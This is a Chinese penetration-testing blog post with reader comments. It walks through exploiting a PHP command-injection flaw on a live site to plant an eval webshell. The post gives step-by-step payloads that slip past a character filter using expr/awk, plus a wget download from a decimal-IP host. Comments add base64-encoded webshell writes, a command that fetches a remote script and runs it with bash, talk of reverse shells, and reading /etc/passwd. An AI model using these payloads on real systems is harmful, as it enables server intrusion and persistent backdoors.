<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">linux渗透测试技巧2则</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">Xeyes</a> <span class="bull">·</span> <time title="2014/03/05 12:18" ui-time="" datetime="2014/03/05 12:18" class="published ng-binding ng-isolate-scope">2014/03/05 12:18</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 背景</h2><hr><p>发现一网站存在漏洞，遂进行测试：</p><p>这是一个获取网页源码的cgi脚本<a href="http://xxx.com/cgi-bin/printfile.cgi?file=http://www.baidu.com">http://xxx.com/cgi-bin/printfile.cgi?file=http://www.baidu.com</a> 习惯性的,在file后面测试 <code>../../../../../</code>包含或者读取漏洞均无效.有意思的是使用File协议(本地文件传输协议)成功读取目录以及文件。</p><p><img alt="2014030416005735884.jpg" img-src="3d7f8b0618948f5ffa63dee15e4ec684d37c5f73.jpg"></p><p>目标环境是Red Hat6.5+Apache ，接下来的工作翻翻敏感文件,找找配置文件收集信息定位当前站点路径.</p><p><img alt="2014030416074032436.jpg" img-src="7f8da630d8b6c01a62b489e224484f53f04b36d1.jpg"></p><h2>0x01 发现突破点</h2><hr><p>经过一段搬砖的时间查看，当前站点没有什么可以利用的,同服站点的脚本语言主要以cgi  perl  为主,少量php .一贯地毯式搜索可以利用的代码,期间找到不少有执行权限的cgi脚本,尝试在浏览器中访问,但是都提示 500内部错误,这样即使成功运行了也无法得知代码运行状态,只能放弃.又经过一段搬砖的时间,在同服站点的php文件中终于让我找到了一行有意思的php脚本代码.</p><pre><code>#!php
exec('make -i -f skriptit/Makefile DOT_EXEC=bin/ SCRIPTDIR=skriptit/ PICNAME='.$file.' htmlcheck dot2png dot2png_large dot2pdf');
</code></pre><p>exec() 执行外部程序,只要能控制 PICNAME='.$file.' 中的变量$file,那就有可能执行系统命令.果断保存代码本地测试.</p><p>代码分析如下:</p><pre><code>#!php
&lt;html&gt;
&lt;head&gt;&lt;title&gt;Content&lt;/title&gt;

&lt;link rel="stylesheet" type="text/css" href="style.css"&gt;&lt;/link&gt;
&lt;link rel="stylesheet" type="text/css" href="styles.css"&gt;&lt;/link&gt;
&lt;script type="text/javascript" src="common.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="css.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="standardista-table-sorting.js"&gt;&lt;/script&gt;
&lt;script type="text/javascript" src="toggle.js"&gt;
&lt;/script&gt;
&lt;script type="text/javascript"&gt;
function updateAppletTarget(q) {
  parent.applet.updateAppletTarget(q);
}
&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div id="change"&gt;
&lt;?php 


$id="";
if (isset($_POST["id"])) $id=$_POST["id"];         // GET或POST接收输入id
else if  (isset($_GET["id"])) $id=$_GET["id"];


if (strlen($id)&gt;0) {

// PUBLIC_ID_SEPARATOR
//$id = ereg_replace(":","|",$id);

#$id="tesdts.fdkjfls|fjksldaf.fdsfaa";
#echo $id;

#note: equivalent function is used in fi.jyu.mit.utils.FileLib.java
#$file = ereg_replace("\\||\\.","_",$id);
$file = ereg_replace("\\||\\:|\\.","_",$id);                            //  ereg_replace -- 如果id传入数据中包含\|:.,_，则ereg_replace正则进入下一个判断。
                                                                        // string ereg_replace ( string pattern, string replacement, string string )

#echo $file;
  if (strpos($file,'\\') !== false                                       // \\strpos检索$file中的字符窜是否包含 \\ 则为false
      or strpos($file,'/') !== false
      or strpos($file,':') !== false) die('Not current directory');      // 提示 Not current directory(非当前目录)



// refresh html file and pics
#    exec('make -f Makefile -C .. PICNAME='.$file.' htmlcheck');
#   exec('make PICNAME='.$file.' htmlcheck');
# die('make -i -f skriptit/Makefile DOT_EXEC=bin/ SCRIPTDIR=skriptit/ PICNAME='.$file.' htmlcheck dot2png dot2png_large dot2pdf');
   exec('make -i -f skriptit/Makefile DOT_EXEC=bin/ SCRIPTDIR=skriptit/ PICNAME='.$file.' htmlcheck dot2png dot2png_large dot2pdf');  # $file往上看
#exec('make PICNAME='.$file.' dot2png dot2png_large dot2pdf');


if ((!file_exists("html/".$file.".html")) || (filesize("html/".$file.".html")==0)) {
    echo "päivitetään "."html/".$file.".html";
?&gt;
&lt;script type="text/javascript"&gt;
 updateAppletTarget('&lt;?php echo $id ?&gt;');
&lt;/script&gt;
&lt;?php  }
else readfile("html/".$file.".html");  

}

?&gt;
&lt;!-- disabled temporirarily 
&lt;a href="#" onclick="updateAppletTarget('edit');return false;"&gt;Muokkaa&lt;/a&gt;
--&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>下图是本地测试，被过滤的字符：</p><pre><code>#!php
 $file = ereg_replace("\\||\\:|\\.","_",$id);   
</code></pre><p>这里的| 以及.都被替换成_(下横)出现 <code>// \\</code> 路径符号则提示Not current directory(非当前目录)</p><p><img alt="2014030416065776275.jpg" img-src="12dbb9de222bad9741780611e8b0c4a80cd8213e.jpg"></p><pre><code>#!php
die('make -i -f skriptit/Makefile DOT\_EXEC=bin/ SCRIPTDIR=skriptit/ PICNAME='.$file.' htmlcheck dot2png dot2png\_large dot2pdf'); 
</code></pre><p>die 打印结果看看：</p><p><img alt="2014030416114563586.png" img-src="109f8a12717a4b324b9096ba137cab0e932030b8.jpg"></p><p>打印结果可以得知</p><pre><code>aaaaa, '`
</code></pre><p>都能带入而且;(分号)也成功执行那么就有意思了,构造语句就是:</p><pre><code>http://localhost/test.php?id=aaaa;echo test &gt;aaa
</code></pre><p>成功写入当前目录.</p><p><img alt="2014030416123189624.png" img-src="d222edd79e9d2c33e7071214cc8a60bb758a6ef9.jpg"></p><p>当然,还可以执行命令,也同样把命令执行结果写入文件得到回显.</p><pre><code>http://localhost/test.php?id=aaaa;id &gt;aaa; 
</code></pre><p>注意末尾多加了一个;(分号)截断了后面多余的东西.</p><p><img alt="2014030416131320282.png" img-src="5ec925bc03b25590b5809851a34ee0ece5446493.jpg"></p><p>接下就是写shell，理清一下思路:</p><pre><code>#!php
$file = ereg_replace("\\||\\:|\\.","_",$id); 
</code></pre><p>| 以及.都被替换成_(下横)，出现 <code>// \\</code> 路径符号则提示Not current directory(非当前目录)，写shell 需要.(点)加后缀 ,如果直接写文件</p><pre><code>http://localhost/test.php?id=aaaa;echo &lt;?php eval($_REQUEST[v]);?&gt; &gt;zzz.php
</code></pre><p>那么得到的文件名是 zzz_php,这里也不能用\ 来转义.</p><p><img alt="2014030416170030636.png" img-src="3364442e80733ea37afe06429a49ef99862ebb65.jpg"></p><p>小伙伴们可能会说,妈蛋,不是还能下载文件吗. 代码这样写</p><pre><code>http://localhost/test.php?id=aaaa;wget www.ccav.com/shell.php
</code></pre><p>那么得到的结果是:</p><pre><code>Not current directory
</code></pre><p>因为包含了.(点)跟路径符号.</p><h2>0x02 绕过方式</h2><hr><p>到这得考虑如何绕过过滤分别使用两个方法得shell.</p><pre><code>1如何echo 写shell 
2.如何通过下载得shell 
</code></pre><h3>第一种方法：</h3><p>如何echo 写shell,以写一句话PHP木马为例,主要解决的是.(点)的问题,$(美元符号),以及>(管道符号)和括号.我这里使用的方法是”借花献佛”</p><p>echo完整的语句如下:</p><pre><code>#!php
echo &lt;?php eval($_REQUEST[v]);?&gt; &gt;test.php
</code></pre><p>既然不能生成那就 ”借”,直接借现有文件中的字符.可以从变量中借或者从现有的文件中借.用到的方法是linux Shell expr的方法.</p><p>如下图,打印了test.php文件中第一行的 6个字符，要做的就是把需要的字符都从文件中借过来。(示例的test.php 就是漏洞文件本身)</p><p><img alt="2014030416213050474.png" img-src="e0af11553972e45f0a26fc487c8ecfa073eb5278.jpg"></p><p>接下来就是体力活了,要把一句话木马中所有被过滤的字符都依次借过来. 要注意的是,读取字符的间隔貌似不能包含空格,否则expr会判断列数错误.</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="34465b5b4074735b5b535851">[email&#160;protected]</a>:/var/www# echo `expr substr $(awk NR==20 test.php) 5 1`
 "     
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="097b66667d494e66666e656c">[email&#160;protected]</a>:/var/www# echo `expr substr $(awk NR==20 test.php) 1 1`
 $
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="7694f6de0419190236311919111a13">[email&#160;protected]</a>:/var/www# echo `expr substr $(awk NR==1 test.php) 1 1`
 &lt;
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="d331537ba1bcbca79394bcbcb4bfb6">[email&#160;protected]</a>:/var/www# echo `expr substr $(awk NR==1 test.php) 6 1`
&gt;
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="fe8c91918abeb9919199929b">[email&#160;protected]</a>:/var/www# expr substr $(awk NR==11 test.php) 35 1     
)     
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="24564b4b5064634b4b434841">[email&#160;protected]</a>:/var/www# expr substr $(awk NR==11 test.php) 33 1     
(
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="bb593b13c9d4d4cffbfcd4d4dcd7de">[email&#160;protected]</a>:/var/www# expr substr $(awk NR==20 test.php) 7 1     
;
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="0be98ba37964647f4b4c64646c676e">[email&#160;protected]</a>:/var/www# expr substr $(awk NR==17 test.php) 2 1     
?
</code></pre><p>最后总算凑够数了,完整的语句是:</p><pre><code>echo `expr substr $(awk NR==1 test.php) 1 1`?php eval`expr substr $(awk NR==11 test.php) 33 1``expr substr $(awk NR==20 test.php) 1 1`_REQUEST[v]`expr substr $(awk NR==11 test.php) 35 1``expr substr $(awk NR==20 test.php) 7 1``expr substr $(awk NR==17 test.php) 2 1``expr substr $(awk NR==1 test.php) 6 1` &gt;2`expr substr $(awk NR==30 test.php) 13 1`php  
</code></pre><p>在shell 下成功执行</p><p><img alt="2014030416261134841.png" img-src="0162cd747409137b9e5fa07c0d8fb76e2f4b7c05.jpg"></p><p>到这里马上就能拿到shell了,用不了多久，我就会升职加薪，当上总经理，出任CEO，迎娶白富美，走上人生巅峰。想想还有点小激动呢，嘿嘿~~</p><p><img alt="2014030416275658281.jpg" img-src="5cd97ec71cc07f09cb8476d48a680f8ea9709a16.jpg"></p><p>我擦,这怎么玩......在测试环境上执行出现的结果,万万没想到最终还是有.(点),因为读test.php文件,还是需要带后缀. 你妹啊.....</p><p><img alt="2014030416233033879.png" img-src="1a698cadaa98bf75b5cf5eee706578a228d028ec.jpg"></p><p>又回到点的问题.这次直接ls >xxx 把当前目录下的文件(目录文件带了后缀)都写入xxx，然后在从xxx 中借.(点)，替换原先的语句。</p><pre><code>http://localhost/test.php?id=aaaa;ls &gt;xxx;
</code></pre><p>以我本地环境为例,xxx文件的第1行第2列（2.php）的字符就是.(点)</p><p><img alt="2014030416293419945.png" img-src="bdd5d0ac941aae310cd5f75a0ce72082f2732a64.jpg"></p><p>将原来语句中的test.php的.(点) 都替换成</p><pre><code>`expr substr $(awk NR==1 xxx)  2 1`
</code></pre><p>原语句：</p><pre><code>echo `expr substr $(awk NR==1 test.php) 1 1`?php eval`expr substr $(awk NR==11 test.php) 33 1``expr substr $(awk NR==20 test.php) 1 1`_REQUEST[v]`expr substr $(awk NR==11 test.php) 35 1``expr substr $(awk NR==20 test.php) 7 1``expr substr $(awk NR==17 test.php) 2 1``expr substr $(awk NR==1 test.php) 6 1` &gt;2`expr substr $(awk NR==30 test.php) 13 1`php
</code></pre><p>改为:</p><pre><code>echo `expr substr $(awk NR==1 test`expr substr $(awk NR==1 xxx)  2 1`php) 1 1`?php eval`expr substr $(awk NR==11 test`expr substr $(awk NR==1 xxx)  2 1`php) 33 1``expr substr $(awk NR==20 test`expr substr $(awk NR==1 xxx)  2 1`php) 1 1`_REQUEST[v]`expr substr $(awk NR==11 test`expr substr $(awk NR==1 xxx)  2 1`php) 35 1``expr substr $(awk NR==20 test`expr substr $(awk NR==1 xxx)  2 1`php) 7 1``expr substr $(awk NR==17 test`expr substr $(awk NR==1 xxx)  2 1`php) 2 1``expr substr $(awk NR==1 test`expr substr $(awk NR==1 xxx)  2 1`php) 6 1` &gt;2`expr substr $(awk NR==30 test`expr substr $(awk NR==1 xxx)  2 1`php) 13 1`php
</code></pre><p>执行出现了语法错误.</p><p><img alt="2014030416323382082.png" img-src="b09cb808b7068d39e07093d850a607e7175d13a8.jpg"></p><p>换一个思路,原来绕了个大弯路.直接<code>cat test.php &gt; xxoo</code> 就解决了. 不过这样还是过滤成了test_php，只能先从 xxx把点借过来.</p><p>语句:</p><pre><code>cat test`expr substr $(awk NR==2 xxx) 6 1`php &gt;xxoo
</code></pre><p>这样把test.php写入xxoo文件就ok了</p><p>最后把test.php全部改成xxoo就解决了点的限制</p><p>原语句：</p><pre><code>echo `expr substr $(awk NR==1 test.php) 1 1`?php eval`expr substr $(awk NR==11 test.php) 33 1``expr substr $(awk NR==20 test.php) 1 1`_REQUEST[v]`expr substr $(awk NR==11 test.php) 35 1``expr substr $(awk NR==20 test.php) 7 1``expr substr $(awk NR==17 test.php) 2 1``expr substr $(awk NR==1 test.php) 6 1` &gt;2`expr substr $(awk NR==30 test.php) 13 1`php
</code></pre><p>修改后:</p><pre><code>echo `expr substr $(awk NR==1 xxoo) 1 1`?php eval`expr substr $(awk NR==11 xxoo) 33 1``expr substr $(awk NR==20 xxoo) 1 1`_REQUEST[v]`expr substr $(awk NR==11 xxoo) 35 1``expr substr $(awk NR==20 xxoo) 7 1``expr substr $(awk NR==17 xxoo) 2 1``expr substr $(awk NR==1 xxoo) 6 1` &gt;2`expr substr $(awk NR==30 xxoo) 13 1`php
</code></pre><p>测试环境成功执行:</p><pre><code>http://localhost/test.php?id=anything;echo `expr substr $(awk NR==1 xxoo) 1 1`?php eval`expr substr $(awk NR==11 xxoo) 33 1``expr substr $(awk NR==20 xxoo) 1 1`_REQUEST[v]`expr substr $(awk NR==11 xxoo) 35 1``expr substr $(awk NR==20 xxoo) 7 1``expr substr $(awk NR==17 xxoo) 2 1``expr substr $(awk NR==1 xxoo) 6 1` &gt;2`expr substr $(awk NR==30 xxoo) 13 1`php;
</code></pre><p><img alt="2014030416381681081.png" img-src="791df8bba2e581774adf241a4cce2ad77b9dcafb.jpg"></p><p>最终成功写入完整的php一句话木马.拿下目标webshell 权限.</p><p><img alt="2014030416360451579.png" img-src="06a1e1a9e6ee55e79aa8ae00cd4474500a9aa745.jpg"></p><h3>总结步骤：</h3><h4>1)</h4><pre><code>ls &gt;xxx ，cat xxx    //先找点，得到.的行列数。
</code></pre><h4>2)</h4><pre><code>Cat  test.`expr substr $(awk NR==1 xxx)  2 1`php  &gt; xxoo  //将test.php 写入xxoo文件，方便后面读取。
</code></pre><h4>3)</h4><pre><code>echo `expr substr $(awk NR==1 xxoo) 1 1`?php eval`expr substr $(awk NR==11 xxoo) 33 1``expr substr $(awk NR==20 xxoo) 1 1`_REQUEST[v]`expr substr $(awk NR==11 xxoo) 35 1``expr substr $(awk NR==20 xxoo) 7 1``expr substr $(awk NR==17 xxoo) 2 1``expr substr $(awk NR==1 xxoo) 6 1` &gt;2`expr substr $(awk NR==30 xxoo) 13 1`php;     //所需的字符从替换成xxoo文件中的字符。
</code></pre><h3>第二种方法:</h3><p>通过下载文件得到shell,这种方法要省事很多,要解决的关键还是.(点),还有//(路径符).(点)的解决可以用数字IP的方法绕过.</p><p>需要条件:</p><pre><code>外网能用ip访问的webserver,以及目标存在wget程序和当前目录有写文件权限。 
</code></pre><p>在线转换链接:</p><pre><code>http://tool.chinaz.com/ip/?IP=127.0.0.1
</code></pre><p><img alt="2014030416412310827.png" img-src="d6e64fe04e952a662bf868c64ad5865b636c6a35.jpg"></p><p>以本机为例（ubuntu +apache2:）</p><pre><code>1.先转换得到数字ip  127.0.0.1 = 2130706433 
2.将外网的服务器的php解析去掉,在apache配置文件中将下面参数注释 
#LoadModule php5_module /usr/lib/apache2/modules/libphp5.so 
3.在根目录创建index.html文件,内容为`&lt;a href="shell.php"&gt;test&lt;/a&gt;`，创建shell.php 内容是马. 
4.使用wget 整站下载功能下载（wget自动沿着href 指向爬到shell.php并下载） 
Ps:貌似用301跳转也可以,不过我没有测试 
</code></pre><p>参数: wget -r 2130706433</p><p>效果如下图，下载后以目录结构的方式保存文件得到shell。</p><p><img alt="2014030416425192388.png" img-src="efd08e19968ba4351e06d89da005c00d2e1f9eab.jpg"></p><h2>0x03 最后</h2><hr><p>欢迎大家指正错误或纰漏，以此文为例，希望大家分享一些linux shell下绕过字符过滤写shell的方法，</p><p>最后感谢月哥悉心的指导。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/11757" rel="bookmark" id="re1">打造自己的php半自动化代码审计工具</a></li><li><a href="http://drops.wooyun.org/web/13249" rel="bookmark" id="re2">PHP本地文件包含漏洞环境搭建与利用</a></li><li><a href="http://drops.wooyun.org/tips/12751" rel="bookmark" id="re3">代码审计入门总结</a></li><li><a href="http://drops.wooyun.org/web/11539" rel="bookmark" id="re4">XSS Attacks - Exploiting XSS Filter</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">12</span> <span class="reply-time">2014-04-14 07:25:17</span></div><p></p><p>wget www.google.com 好像是下载默认页... 找个不解析 PHP 服务器 设为默认页就搞定了.</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瞌睡龙</span> <span class="reply-time">2014-03-12 18:10:05</span></div><p></p><p>赞小伙伴~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">tmp</span> <span class="reply-time">2014-03-12 16:49:43</span></div><p></p><p>[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="593b36193b36">[email&#160;protected]</a> shm]$ cat test.php<br>ddddddddddddddd<br>[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ccaea38caea3">[email&#160;protected]</a> shm]$ echo ddddddddddddddd &gt;&gt; test*php<br>[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3c5e537c5e53">[email&#160;protected]</a> shm]$ cat test*php<br>ddddddddddddddd<br>ddddddddddddddd</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">tmp</span> <span class="reply-time">2014-03-12 16:32:45</span></div><p></p><p>vps上 放个1 .<br>1里面的内容是<br>echo "" &gt; test.php<br>(其实1里面可以是各种反连脚本.)<br>在1所在的目录执行 python -m SimpleHTTPServer 8080</p><p>在target的web上.wget 2130706433:8080/1 -O xxx ;bash xxx<br>一句话应该就写进去了.<br>如果不能反连.就要在web上老老实实的echo bas64过的东西了.</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">tmp</span> <span class="reply-time">2014-03-12 16:00:20</span></div><p></p><p>base64 %3c 1 %3e b ; base64 -d %3c b %3e 1<br>. 也可以用%2e 测试看看</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">tmp</span> <span class="reply-time">2014-03-12 15:51:37</span></div><p></p><p>...我写的命令被过滤了 ???<br>写一个脚本1.脚本里面是 bash script (把你想做的命令都写里面). base64 b , 用你的第二个办法wget 过来. 直接在web . base64 -d<b>1. 然后 bash 1. 这样就不用在web的输入上面过多的和. | 等符号扯淡了.<br>1 里面可以是反连脚本.也可以是写入php一句的动作.</b></p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">tmp</span> <span class="reply-time">2014-03-12 15:49:27</span></div><p></p><p>写一个脚本1.脚本里面是 bash script (把你想做的命令都写里面). base64 b , 用你的第二个办法wget 过来. 直接在web . base64 -d <b>1. 然后 bash 1. 这样就不用在web的输入上面过多的和. | 等符号扯淡了.<br>1 里面可以是反连脚本.也可以是写入php一句的动作.</b></p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Xeyes</span> <span class="reply-time">2014-03-12 12:18:07</span></div><p></p><p>求实例代码.</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">tmp</span> <span class="reply-time">2014-03-12 09:18:47</span></div><p></p><p>@loopx9 ` 用$()绕过</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">tmp</span> <span class="reply-time">2014-03-12 09:14:50</span></div><p></p><p>shell script 只要能混淆或拼凑命令基本都能绕过 .<br>IFS 也可以绕过|<br>至于base64 如果是在web提交注意base64字符串中的+等特殊符号.会被转移.把+号这些特殊符号urlcode一下就ok</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">tmp</span> <span class="reply-time">2014-03-12 09:09:53</span></div><p></p><p>办法太多了............</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">YHHK</span> <span class="reply-time">2014-03-09 10:45:22</span></div><p></p><p>膜拜逻辑怪。。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">loopx9</span> <span class="reply-time">2014-03-07 14:29:09</span></div><p></p><p>如果`也过滤了呢？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">dotneter</span> <span class="reply-time">2014-03-06 23:24:22</span></div><p></p><p>file=file:///etc/passwd</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">dotneter</span> <span class="reply-time">2014-03-06 23:20:19</span></div><p></p><p>好流弊！！！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">hkAssassin</span> <span class="reply-time">2014-03-06 14:25:26</span></div><p></p><p>楼主 http://localhost/test.php?id=aaaa;echo test &gt;aaa 这句如果换成http://www.xxx.com/test.php?id=aaaa;echo test &gt;aaa 我测试的结果是写不进文件这是为什么？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">SUNRISE</span> <span class="reply-time">2014-03-06 10:09:37</span></div><p></p><p>漏了点东西，之前那串php代码是base64加密的，写入的内容是eval(base64_decode("base64字符串"))。虽然没有测试，不过我觉得php -r base64_decode("xxxxx")应该也是可以的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">SUNRISE</span> <span class="reply-time">2014-03-06 10:07:06</span></div><p></p><p>遇到过，我的解决方法是写一串php代码，代码内容是生成一个名为x.php内容为一句话的文件，然后整串echo 到一个不带点的文件xxx里，不是能执行命令么，直接php xxx。前期读文件的时候一律用通配符“?”，也考虑追加文件但是权限低点不能修改，只能写入。楼主的想法不错，就是有点绕。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">SUNRISE</span> <span class="reply-time">2014-03-06 10:03:10</span></div><p></p><p>我遇到过，用的是 "?"</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ray</span> <span class="reply-time">2014-03-06 10:01:19</span></div><p></p><p>php -r "eval(base64_decode('写点什么'));"　应该也是可以的吧。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xiaoL</span> <span class="reply-time">2014-03-06 09:16:12</span></div><p></p><p>本地随便找一个PHP后缀文件<br>比如<br>hello.php<br>用 `ls hello*php`<br>可以识别，跟点有什么关系</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">zol</span> <span class="reply-time">2014-03-06 02:07:06</span></div><p></p><p>. 点被过滤</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">wefgod</span> <span class="reply-time">2014-03-05 23:25:44</span></div><p></p><p>是说WEB环境下的命令执行，php的。在系统直接执行这个是可行的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">wefgod</span> <span class="reply-time">2014-03-05 23:25:16</span></div><p></p><p>这个我在做江南科友的HAC的时候测试过，无效的。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xiaoL</span> <span class="reply-time">2014-03-05 18:04:22</span></div><p></p><p>shell*意思是本地存在的一个shell.php文件<br>你可以随意找一个</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ccSec</span> <span class="reply-time">2014-03-05 16:41:06</span></div><p></p><p>第二个思路不错。<br>评论更亮。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">寂寞的瘦子</span> <span class="reply-time">2014-03-05 16:36:36</span></div><p></p><p>神奇，想到一起拉~~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">游客</span> <span class="reply-time">2014-03-05 16:28:17</span></div><p></p><p>直接反弹shell。<br>可以命令直接反弹，也可以下载脚本执行后反弹。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Xeyes</span> <span class="reply-time">2014-03-05 16:24:22</span></div><p></p><p>上面我打错了,应该三三部曲:</p><p>echo dGVzdC5waHA= &gt;1</p><p>echo PD9waHAgZXZhbCgkX1JFUVVFU1Rbdl0pOz8+ &gt;2</p><p>echo `base64 -d 2` &gt;`base64 -d 1`</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Xeyes</span> <span class="reply-time">2014-03-05 16:22:25</span></div><p></p><p>恩,了解.</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Xeyes</span> <span class="reply-time">2014-03-05 16:20:50</span></div><p></p><p><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="610355020a03511921260e0e060d04">[email&#160;protected]</a>:/tmp$ wget 2130706433 -O `ls shell*`<br>--2014-03-05 16:20:29-- http://2130706433/<br>正在解析主机 2130706433 (2130706433)... 127.0.0.1<br>正在连接 2130706433 (2130706433)|127.0.0.1|:80... 已连接。<br>已发出 HTTP 请求，正在等待回应... 200 OK<br>长度： 206 [text language="/html"][/text]<br>正在保存至: “shell*”</p><p>100%[======================================&gt;] 206 --.-K/s 用时 0s</p><p>2014-03-05 16:20:29 (20.5 MB/s) - 已保存 “shell*” [206/206])</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">寂寞的瘦子</span> <span class="reply-time">2014-03-05 16:07:49</span></div><p></p><p>第二句的PD9waHAgZXZhbCgkX1JFUVVFU1Rbdl0pOz8+不要base64的，直接1<br>echo 